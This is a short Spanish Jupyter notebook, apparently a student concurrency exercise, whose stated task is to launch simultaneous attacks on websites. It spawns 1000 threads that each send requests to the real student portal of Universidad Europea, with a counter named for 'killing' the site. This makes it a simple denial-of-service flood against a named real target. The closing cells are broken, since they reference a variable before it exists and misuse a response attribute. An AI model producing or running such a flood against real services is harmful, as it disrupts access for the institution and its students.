# %% [markdown]
# # 3er programa

# %% [markdown]
# ## Se solicita realizar ataques simultaneos a los siguientes sitios webs:

# %%
import threading, os, platform, requests

# %%
numero_de_veces_hasta_matar_uem = 1000

# %% [markdown]
# ## Http codes

# %%
from IPython import display

# %%
display.Image("code.jpg")

# %%
url_= "https://portaldelestudiante.universidadeuropea.es/"

# %%
ls
# Out:
#  Volume in drive C is Windows
#  Volume Serial Number is 4E2A-B016
#
#  Directory of C:\Users\leti\PCD\Ataques
#
# 04/10/2021  12:33    <DIR>          .
# 04/10/2021  12:33    <DIR>          ..
# 04/10/2021  12:18    <DIR>          .ipynb_checkpoints
# 04/10/2021  12:16            81,525 code.jpg
# 04/10/2021  12:33           113,676 Untitled.ipynb
#                2 File(s)        195,201 bytes
#                3 Dir(s)  210,281,443,328 bytes free

# %%
def matar_uem ():
    print(requests.get(url_))
    threading.current_thread()

# %%
for i in range (numero_de_veces_hasta_matar_uem):
    threading.Thread(target=matar_uem).start()

# %%
res_.headers

# %%
res_=requests.get("https://rpubs.com/christian_sucuzhanay")

# %%
html =res_.text()
